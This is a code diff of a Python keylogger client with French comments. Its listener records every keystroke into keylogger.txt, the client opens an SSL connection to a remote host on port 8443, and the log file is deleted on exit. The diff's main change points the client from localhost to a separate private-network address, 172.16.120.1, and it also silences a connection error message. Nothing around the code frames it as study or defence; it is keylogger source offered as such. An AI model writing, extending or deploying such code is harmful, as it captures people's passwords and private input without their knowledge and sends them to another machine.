@@ -6,6 +6,7 @@ from pynput import keyboard
 import os
 
 
+
 def read_data_from_file(file_path):
     with open(file_path, 'r') as file:
         data = file.read()
@@ -28,10 +29,13 @@ def record_key(key):
 
     if str(key) == "Key.enter":
         add_one_char("\n")
+
     elif str(key) == "Key.space":
         add_one_char(" ")
+
     elif str(key) == "Key.backspace":
         del_one_char()
+
     elif hasattr(key, 'char'):
         add_one_char(key.char)
 
@@ -48,7 +52,7 @@ def stop_client(conn, socket, listener, filepath):
     # suppression du fichier (sans erreur si le fichier n'existe pas)
     pathlib.Path.unlink(filepath, missing_ok=True)
 
-    exit()
+    exit(0)
 
 
 def create_ssl_conn(host, port):
@@ -82,7 +86,6 @@ def create_ssl_conn(host, port):
 
             except Exception as e:
                 print("Erreur lors de la connexion")
-                print(e)
 
                 retries = retries + 1
                 
@@ -100,7 +103,7 @@ listener = keyboard.Listener(on_press=record_key)
 listener.start()
 
 
-host = '127.0.0.1'
+host = '172.16.120.1'
 port = 8443 
 
 file_path = 'keylogger.txt'  
